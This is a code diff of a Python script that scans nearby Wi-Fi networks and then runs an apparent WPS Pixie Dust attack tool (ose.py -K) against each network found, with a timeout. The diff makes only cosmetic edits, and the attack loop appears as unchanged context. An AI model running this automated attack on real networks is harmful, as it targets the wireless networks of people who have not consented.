@@ -4,6 +4,8 @@ import nmcli
 import os
 import subprocess
 import time
+import signal
+import sys
 
 
 INTERFACE = os.getenv("INTERFACE")
@@ -15,13 +17,12 @@ def scan(interface: str, rescan: bool=True):
 
 
 def main_loop():
-    print("This script can be stopped with ctrl+z")
     print("The outputs will be saved in the start script directory (ultimatetrollium/reports)")
     time.sleep(3)
 
     networks = scan(INTERFACE, True)
 
-    print(f"Networks found:\n")
+    print("Networks found:\n")
     for network in networks:
         print("--------")
         if network.ssid != "":
@@ -45,6 +46,6 @@ def main_loop():
 
         subprocess.run(f"timeout {TIMEOUT} sudo ../ose/ose.py -i {INTERFACE} -K -F --bssid {network.bssid}", shell=True)
 
-
+        
 if __name__ == "__main__":
     main_loop()
